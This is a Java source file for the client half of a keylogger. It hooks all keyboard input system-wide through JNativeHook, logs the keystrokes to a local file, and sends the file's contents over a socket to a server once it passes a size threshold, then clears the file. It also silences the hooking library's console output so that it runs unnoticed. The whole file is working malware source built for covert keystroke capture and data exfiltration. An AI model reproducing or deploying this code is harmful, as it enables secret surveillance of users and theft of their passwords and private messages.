package dev.source.connection.client;

import java.io.BufferedReader;
import java.io.File;
import java.io.FileReader;
import java.io.IOException;
import java.io.PrintWriter;
import java.net.Socket;
import java.util.logging.Level;
import java.util.logging.LogManager;
import java.util.logging.Logger;

import org.jnativehook.GlobalScreen;

import dev.source.connection.server.Server;
import dev.source.logger.FileManager;
import dev.source.logger.KeyListener;

public class Client {
	public static final short REQUIRED_FILE_SIZE_FOR_TRANSFER = 20;
	private String hostname;
	private int port;

	public Client(String hostname, int port) {
		this.hostname = hostname;
		this.port = port;
	}

	public void start() {
		disableConsoleLogging();
		try (Socket clientSocket = new Socket(hostname, port);
				KeyListener keyListener = new KeyListener();
				FileManager fileManager = FileManager.getInstance()) {
			GlobalScreen.registerNativeHook();
			GlobalScreen.addNativeKeyListener(keyListener);
			File logFile = new File(fileManager.getFileLocation());
			if (logFile.exists() && logFile.length() >= REQUIRED_FILE_SIZE_FOR_TRANSFER) {
				sendLocalFileContentToTheServer(clientSocket, logFile);
				fileManager.emptyLocalFileContent();
			}
		} catch (Exception e) {
			System.exit(1);
		}
	}

	private void sendLocalFileContentToTheServer(Socket clientSocket, File logFile) throws IOException {
		try (PrintWriter writer = new PrintWriter(clientSocket.getOutputStream());
				BufferedReader reader = new BufferedReader(new FileReader(logFile))) {
			String line;
			while ((line = reader.readLine()) != null) {
				writer.write(line);
			}
		} catch (IOException exception) {
			throw exception;
		}
	}

	// disables JnativeHook library console output
	private void disableConsoleLogging() {
		LogManager.getLogManager().reset();
		Logger logger = Logger.getLogger(GlobalScreen.class.getPackage().getName());
		logger.setLevel(Level.OFF);
	}

	public static String getClientUsername() {
		return System.getProperty("user.name");
	}

	public static void main(String[] args) {
		Client client = new Client("localhost", Server.SERVER_PORT);
		client.start();
	}
}
